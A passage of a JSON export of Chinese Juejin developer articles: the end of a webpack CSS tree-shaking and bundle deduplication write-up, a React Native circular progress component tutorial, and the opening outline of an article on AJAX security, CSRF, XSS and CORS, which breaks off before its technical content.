src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde28789c23f?w=720\u0026amp;h=394\u0026amp;f=jpeg\u0026amp;s=16294\"\u003e\u003c/div\u003e\u003cp\u003e整体又是一个webpack的插件，架构图如下：\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde288369a85?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=17641\"\u003e\u003c/div\u003e\u003cp\u003e主要流程：\u003c/p\u003e\u003cul\u003e\u003cli\u003e插件监听webapck编译完成事件，webpack编译完成之后，从compilation中找出所有的css文件和js文件\u003c/li\u003e\u003c/ul\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003eapply (compiler) {\n    compiler.plugin(\u003cspan class=\"hljs-string\"\u003e'after-emit'\u003c/span\u003e, (compilation, callback) =\u0026gt; {\n\n      \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e styleFiles = Object.keys(compilation.assets).filter(asset =\u0026gt; {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e /\\.css$/.test(asset)\n      })\n\n      \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e jsFiles = Object.keys(compilation.assets).filter(asset =\u0026gt; {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e /\\.(js|jsx)$/.test(asset)\n      })\n\n     ....\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\u003cli\u003e将所有的css文件送至postCss处理，找出无用代码\u003c/li\u003e\u003c/ul\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e   \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e tasks = []\n    styleFiles.forEach((filename) =\u0026gt; {\n        const \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e = compilation.assets[filename].source()\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e listOpts = {\n          include: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n          \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e: jsContents,  //传入全部js文件\n          opts: this.options   //插件配置选项\n        }\n        tasks.push(postcss(treeShakingPlugin(listOpts)).process(\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e).then(result =\u0026gt; {       \n          \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e css = result.toString()  // postCss处理后的css AST  \n          //替换webpack的编译产物compilation\n          compilation.assets[filename] = {\n            \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e: () =\u0026gt; css,\n            size: () =\u0026gt; css.length\n          }\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e result\n        }))\n    })\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\u003cli\u003epostCss 遍历，匹配，删除过程\u003c/li\u003e\u003c/ul\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e module.exports = postcss.plugin(\u003cspan class=\"hljs-string\"\u003e'list-selectors'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (options) {\n    // 从根节点开始遍历\n    cssRoot.walkRules(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (rule) {\n      // Ignore keyframes, \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e can \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e e.g. 10%, 20% as selectors\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (rule.parent.type === \u003cspan class=\"hljs-string\"\u003e'atrule'\u003c/span\u003e \u0026amp;\u0026amp; /keyframes/.test(rule.parent.name)) \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\n      \n      // 对每一个规则进行处理\n      checkRule(rule).then(result =\u0026gt; {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (result.selectors.length === 0) {\n          // 选择器全部被删除\n          \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e' ✂️ ['\u003c/span\u003e + rule.selector + \u003cspan class=\"hljs-string\"\u003e'] shaked, [1]'\u003c/span\u003e\n          console.log(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e)\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (config.remove) {\n            rule.remove()\n          }\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n          // 选择器被部分删除\n          \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e shaked = rule.selectors.filter(item =\u0026gt; {\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e result.selectors.indexOf(item) === -1\n          })\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (shaked \u0026amp;\u0026amp; shaked.length \u0026gt; 0) {\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e' ✂️ ['\u003c/span\u003e + shaked.join(\u003cspan class=\"hljs-string\"\u003e' '\u003c/span\u003e) + \u003cspan class=\"hljs-string\"\u003e'] shaked, [2]'\u003c/span\u003e\n            console.log(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e)\n          }\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (config.remove) {\n            // 修改AST抽象语法树\n            rule.selectors = result.selectors\n          }\n        }\n      })\n    })\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003echeckRule 处理每一个规则核心代码\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e checkRule = (rule) =\u0026gt; {\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise(resolve =\u0026gt; {\n        ...\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e secs = rule.selectors.filter(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (selector) {\n          \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e result = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n          \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e processor = parser(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (selectors) {\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0, len = selectors.nodes.length; i \u0026lt; len; i++) {\n              \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e node = selectors.nodes[i]\n              \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (_.includes([\u003cspan class=\"hljs-string\"\u003e'comment'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'combinator'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'pseudo'\u003c/span\u003e], node.type)) \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n              \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e j = 0, len2 = node.nodes.length; j \u0026lt; len2; j++) {\n                \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e n = node.nodes[j]\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!notCache[n.value]) {\n                  switch (n.type) {\n                    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'tag'\u003c/span\u003e:\n                      // nothing\n                      \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n                    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e:\n                    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'class'\u003c/span\u003e:\n                      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!classInJs(n.value)) {\n                        // 调用classInJs判断是否在JS中出现过\n                        notCache[n.value] = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n                        result = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n                        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n                      }\n                      \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n                    default:\n                      // nothing\n                      \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n                  }\n                } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                  result = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n                  \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n                }\n              }\n            }\n          })\n          ...\n        })\n        ...\n      })\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到其实我只处理里 id选择器和class选择器，id和class相对来说副作用小，引起样式异常的可能性相对较小。\u003c/p\u003e\u003cp\u003e判断css是否再js中出现过，是使用正则匹配。\u003c/p\u003e\u003cp\u003e其实，后续还可以继续优化，比如对tag类的选择器，可以配置是否再html，jsx，template中出现过，如果出现过，没有出现过也可以认为是无用代码。\u003c/p\u003e\u003cp\u003e当然，插件能正常工作还是的有一些前提和约束。我们可以在代码中动态改变css，比如再react和vue中，可以这么写\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde28dd70e3b?w=720\u0026amp;h=219\u0026amp;f=jpeg\u0026amp;s=11908\"\u003e\u003c/div\u003e\u003cp\u003e这样是比较推荐的方式，选择器作为字符或变量名出现在代码中，下面这样动态生成选择器的情况就会导致匹配失败\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n  this.stateClass = \u003cspan class=\"hljs-string\"\u003e'state-'\u003c/span\u003e + this.state == 2 ? \u003cspan class=\"hljs-string\"\u003e'open'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div class={this.stateClass}\u0026gt;\u0026lt;/div\u0026gt;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其中这样情况很容易避免\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n  this.stateClass = this.state == 2 ? \u003cspan class=\"hljs-string\"\u003e'state-open'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'state-close'\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div class={this.stateClass}\u0026gt;\u0026lt;/div\u0026gt;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e所以有一个好的编码规范的约束，插件能更好的工作。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e（3）webpack bundle文件去重\u003c/h2\u003e\u003cp\u003e如果webpack打包后的bundle文件中存在着相同的模块，也属于无用代码的一种。也应该被去除掉\u003c/p\u003e\u003cp\u003e首先我们需要一个能对bundle文件定性分析的工具，能发现问题，能看出优化效果。\u003c/p\u003e\u003cp\u003ewebpack-bundle-analyzer这个插件完全能满足我们的需求，他能以图形化的方式展示bundle中所有的模块的构成的各构成的大小。\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde29710f82d?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=18473\"\u003e\u003c/div\u003e\u003cp\u003e其次，需求对通用模块进行提取，CommonsChunkPlugin是最被人熟知的用于提供通用模块的插件。早期的时候，我并不完全了解他的功能，并没有发挥最大的功效。\u003c/p\u003e\u003cp\u003e下面介绍CommonsChunkPlugin的正确用法\u003c/p\u003e\u003cp\u003e\u003cb\u003e自动提取所有的node_moudles或者引用次数两次以上的模块\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde2a12a6464?w=720\u0026amp;h=192\u0026amp;f=jpeg\u0026amp;s=9906\"\u003e\u003c/div\u003e\u003cp\u003eminChunks可以接受一个数值或者函数，如果是函数，可自定义打包规则\u003c/p\u003e\u003cp\u003e但使用上面记载的配置之后，并不能高枕无忧。因为这个配置只能提取所有entry打包后的文件中的通用模块。而现实是，有了提高性能，我们会按需加载，通过webpack提供的import（...）方法，这种按需加载的文件并不会存在于entry之中，所以按需加载的异步模块中的通用模块并没有提取。\u003c/p\u003e\u003cp\u003e\u003cb\u003e如何提取按需加载的异步模块里的通用模块呢？\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde2a3cd1f44?w=720\u0026amp;h=331\u0026amp;f=jpeg\u0026amp;s=21512\"\u003e\u003c/div\u003e\u003cp\u003e配置另一个CommonsChunkPlugin，添加async属性，async可以接受布尔值或字符串。当时字符串时，默认是输出文件的名称。\u003c/p\u003e\u003cp\u003enames是所有异步模块的名称\u003c/p\u003e\u003cp\u003e这里还涉及一个给异步模块命名的知识点。我是这样做的：\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst Edit = resolve =\u0026gt; { import( /* webpackChunkName: \u003cspan class=\"hljs-string\"\u003e\"EditPage\"\u003c/span\u003e */ \u003cspan class=\"hljs-string\"\u003e'./pages/Edit/Edit'\u003c/span\u003e).then((mod) =\u0026gt; { resolve(mod.default); }) };\nconst PublishPage = resolve =\u0026gt; { import( /* webpackChunkName: \u003cspan class=\"hljs-string\"\u003e\"Publish\"\u003c/span\u003e */ \u003cspan class=\"hljs-string\"\u003e'./pages/Publish/Publish'\u003c/span\u003e).then((mod) =\u0026gt; { resolve(mod); }) };\nconst Models = resolve =\u0026gt; { import( /* webpackChunkName: \u003cspan class=\"hljs-string\"\u003e\"Models\"\u003c/span\u003e */ \u003cspan class=\"hljs-string\"\u003e'./pages/Models/Models'\u003c/span\u003e).then((mod) =\u0026gt; { resolve(mod.default); }) };\nconst MediaUpload = resolve =\u0026gt; { import( /* webpackChunkName: \u003cspan class=\"hljs-string\"\u003e\"MediaUpload\"\u003c/span\u003e */ \u003cspan class=\"hljs-string\"\u003e'./pages/Media/MediaUpload'\u003c/span\u003e).then((mod) =\u0026gt; { resolve(mod); }) };\nconst RealTime = resolve =\u0026gt; { import( /* webpackChunkName: \u003cspan class=\"hljs-string\"\u003e\"RealTime\"\u003c/span\u003e */ \u003cspan class=\"hljs-string\"\u003e'./pages/RealTime/RealTime'\u003c/span\u003e).then((mod) =\u0026gt; { resolve(mod.default); }) };\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e没错，在import里添加注释。/* webpackChunkName: \"EditPage\" */ ，虽然看着不舒服，但是管用。\u003c/p\u003e\u003cp\u003e贴一个项目的优化效果对比图\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde2aa751805?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=27747\"\u003e\u003c/div\u003e\u003cp\u003e优化效果还是比较明显。\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde2aa34e682?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=25678\"\u003e\u003cdiv\u003e优化前bundle\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde2ae93d057?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=24291\"\u003e\u003cdiv\u003e优化后bundle\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e最后思考一个问题：\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e不同entry模块或按需加载的异步模块需不需要提取通用模块？\u003c/b\u003e\u003c/p\u003e\u003cp\u003e这个需要看场景了，比如模块都是在线加载的，如果通用模块提取粒度过小，会导致首页首屏需要的文件变多，很多可能是首屏用不到的，导致首屏过慢，二级或三级页面加载会大幅提升。所以这个就需要根据业务场景做权衡，控制通用模块提取的粒度。\u003c/p\u003e\u003cp\u003e百度外卖的移动端应用场景是这样的，我们所有的移动端页面都做了离线化的处理。离线之后，加载本地的js文件，与网络无关，基本上可以忽略文件大小，所以更关注整个离线包的大小。离线包越小，耗费用户的流量就越小，用户体验更好，所以离线化的场景是非常适合最小粒提取通用模块的，即将所有entry模块和异步加载模块的引用大于2的模块都提取，这样能获得最小的输出文件，最小的离线包。\u003c/p\u003e\u003cp\u003e1月20日，我将在掘金分享《百度外卖前端离线化实践》，有兴趣的可以关注一下。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e文本提到的插件都是开源的，链接汇总，欢迎交流，欢迎戳❤\u003c/p\u003e\u003cp\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/babel-plugin-import-fix\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb878d28e?w=120\u0026amp;h=120\u0026amp;f=jpeg\u0026amp;s=4686\" alt=\"图标\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/babel-plugin-import-fix\"\u003elin-xi/babel-plugin-import-fix\u003c/a\u003e\u003c/div\u003e\u003cdiv\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/webpack-css-treeshaking-plugin\"\u003elin-xi/webpack-css-treeshaking-plugin\u003c/a\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1515067103.3445","__v":0}
{"_id":{"$oid":"5a4e181827fe912a1025ce7c"},"id":"5a4d89b5f265da4334705190","author":{"$oid":"5a4b770f19da8721f49c06f7"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bee207f74fdf7?w=320\u0026h=580\u0026f=gif\u0026s=1898994","https://user-gold-cdn.xitu.io/2018/1/4/160bee2080dffc43?w=949\u0026h=584\u0026f=png\u0026s=205071","https://user-gold-cdn.xitu.io/2018/1/4/160bee2080cacd689?w=500\u0026h=322\u0026f=gif\u0026s=1209637"],"screenShot":null}],"title":"React Native 圆形进度条组件","meta":{"likeCount":0},"tag":["React Native"],"comment":[],"shortContent":"IOS需要手动Link下ReactART，用Xcode打开项目，添加ART.xcodeproj到Libraries中，然后在Link Binary With Libraries中添加libART.a。如下图所示： backgroundColor - color of a bac…","content":"\u003cp\u003e\u003cem\u003e本文原创首发于公众号：ReactNative开发圈，转载需注明出处。\u003c/em\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReact Native 圆形进度条组件：react-native-circular-progress，圆形的进度条组件，支持动画，支持iOS和Android。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e演示动画\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee207f74fdf7?w=320\u0026amp;h=580\u0026amp;f=gif\u0026amp;s=1898994\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e安装方法\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003enpm i --save react-native-circular-progress\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eIOS需要手动Link下ReactART，用Xcode打开项目，添加ART.xcodeproj到Libraries中，然后在Link Binary With Libraries中添加libART.a。如下图所示：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee2080dffc43?w=949\u0026amp;h=584\u0026amp;f=png\u0026amp;s=205071\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e使用示例\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { AnimatedCircularProgress } from \u003cspan class=\"hljs-string\"\u003e'react-native-circular-progress'\u003c/span\u003e;\n\n\u0026lt;AnimatedCircularProgress\n  size={120}\n  width={15}\n  fill={100}\n  tintColor=\u003cspan class=\"hljs-string\"\u003e\"#00e0ff\"\u003c/span\u003e\n  onAnimationComplete={() =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e'onAnimationComplete'\u003c/span\u003e)}\n  backgroundColor=\u003cspan class=\"hljs-string\"\u003e\"#3d5875\"\u003c/span\u003e /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eAPI说明\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003esize – width and height of the circle（圆形的宽度和高度）\u003c/li\u003e\n\u003cli\u003ewidth - thickness of the lines（圆形线的宽度）\u003c/li\u003e\n\u003cli\u003ebackgroundWidth - thickness of the background line（背景线的宽度）\u003c/li\u003e\n\u003cli\u003efill - current, percentage fill (from 0 to 100)（进度值）\u003c/li\u003e\n\u003cli\u003eprefill - percentage fill before the animation (from 0 to 100)（预先设置的进度值）\u003c/li\u003e\n\u003cli\u003etintColor - color of a progress line（圆形的线的颜色）\u003c/li\u003e\n\u003cli\u003ebackgroundColor - color of a background for progress line. Use 'transparent' to hide(背景线的颜色）\u003c/li\u003e\n\u003cli\u003erotation - by default, progress starts from the angle = 90⦝, you can change it by setting value from -360 to 360(旋转度数)\u003c/li\u003e\n\u003cli\u003etension - the tension value for the spring animation (see here)\u003c/li\u003e\n\u003cli\u003efriction - the friction value for the spring animation (see here)\u003c/li\u003e\n\u003cli\u003elinecap - the shape to be used at the ends of the circle. Possible values: butt (default), round or square. (see here)\u003c/li\u003e\n\u003cli\u003echildren(fill) - you can pass function as a child to receive current fill\u003c/li\u003e\n\u003cli\u003eonAnimationComplete - you can pass a callback function that will be invoked when animation is complete. (see here)(动画结束时的事件)\u003c/li\u003e\n\u003cli\u003eonLinearAnimationComplete - you can pass a callback function that will be invoked when linear animation is complete. (see here)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e特别说明\u003c/h2\u003e\n\u003cp\u003e在react-native 0.50.4版本中，backgroundColor设置transparent时会报错。暂时没找到原因。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e完整示例\u003c/h2\u003e\n\u003cp\u003e完整代码：\u003ca target=\"_blank\" href=\"http://codeismoney.com/react-native-circular-progress/\"\u003eReact Native 圆形进度条组件 | forrest23.github.io\u003c/a\u003e\n本次示例代码在 Component03文件夹中。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e组件地址\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/bgryszko/react-native-circular-progress\"\u003eGitHub - bgryszko/react-native-circular-progress: React Native component for creating animated, circular progress with ReactART\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e微信不让跳转外链，可以点击查看原文来查看外链GitHub内容。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e举手之劳关注我的微信公众号：\u003cstrong\u003eReactNative开发圈\u003c/strong\u003e\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee2080cacd689?w=500\u0026amp;h=322\u0026amp;f=gif\u0026amp;s=1209637\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1515066153.5413","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac8e"},"id":"5a4d76f2f265da430d586b8e","author":{"$oid":"5a4cc287fa7d97296c4556c5"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160be9debc135579?w=495\u0026h=601\u0026f=png\u0026s=27280","https://user-gold-cdn.xitu.io/2018/1/4/160be9ab40b90f39?w=803\u0026h=428\u0026f=png\u0026s=18140","https://user-gold-cdn.xitu.io/2018/1/4/160be99c5aab35bf?w=904\u0026h=739\u0026f=png\u0026s=95721","https://user-gold-cdn.xitu.io/2018/1/4/160be99c3fef1c7b?w=371\u0026h=430\u0026f=png\u0026s=27656","https://user-gold-cdn.xitu.io/2018/1/4/160be99c3e5ee9b9?w=1031\u0026h=767\u0026f=png\u0026s=142755","https://user-gold-cdn.xitu.io/2018/1/4/160be99c3d440284?w=565\u0026h=493\u0026f=png\u0026s=12366","https://user-gold-cdn.xitu.io/2018/1/4/160be99cab36918d?w=880\u0026h=476\u0026f=png\u0026s=25763"],"screenShot":null}],"title":"AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。","meta":{"likeCount":0},"tag":["Ajax","安全","XSS","浏览器"],"comment":[],"shortContent":"本文包含的内容较多，包括AJAX，CORS，XSS，CSRF等内容，要完整的看完并理解需要付出一定的时间。 另外，见解有限，如有描述不当之处，请帮忙及时指出。 正文开始... 从入坑前端开始，一直到现在，AJAX请求都是以极高的频率重复出现，也解决过不少AJAX中遇到的问题，如…","content":"\u003ch2 class=\"heading\"\u003e开篇三问\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX请求真的不安全么？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX请求哪里不安全？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e怎么样让AJAX请求更安全？\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e本文包含的内容较多，包括AJAX，CORS，XSS，CSRF等内容，要完整的看完并理解需要付出一定的时间。\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e另外，见解有限，如有描述不当之处，请帮忙及时指出。\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e正文开始...\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e从入坑前端开始，一直到现在，AJAX请求都是以极高的频率重复出现，也解决过不少AJAX中遇到的问题，如跨域调试，错误调试等等。\u003c/p\u003e\n\u003cp\u003e从这种，发现了一个共通现象：\u003cstrong\u003e那就是每次和后台人员对接时，他们都会提到\u003ccode\u003eAJAX请求不安全\u003c/code\u003e，请用普通http请求！\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e虽然很多时候，都是经过多翻口舌之争后，最终后台那边妥协，允许部分符合条件的AJAX请求。但是，我却很纠结一个问题：\u003cstrong\u003eAJAX请求真的不安全么？为什么我自己写后台时并没有发现这个问题？\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e于是，开始准备搜集资料，结合自己已有的认知，整理成一份解决方案，分析\u003ccode\u003eAJAX请求真的不安全么？哪里不安全？\u003c/code\u003e，后续遇到类似的问题就直接\u003cstrong\u003e向对方抛出一篇文章\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e大纲\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX请求真的不安全么\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAJAX不安全的说法从何而来\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e常见的几种Web前端安全问题\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eCSRF简介\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCSRF与AJAX的关系\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eXSS简介\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eXSS与AJAX的关系\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSQL注入简介\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSQL注入与AJAX的关系\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX和HTTP请求的区别\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCORS与AJAX安全性之间的关联\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eCORS与AJAX关系的简介\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e为什么要配置CORS？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCORS会配置些什么信息？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\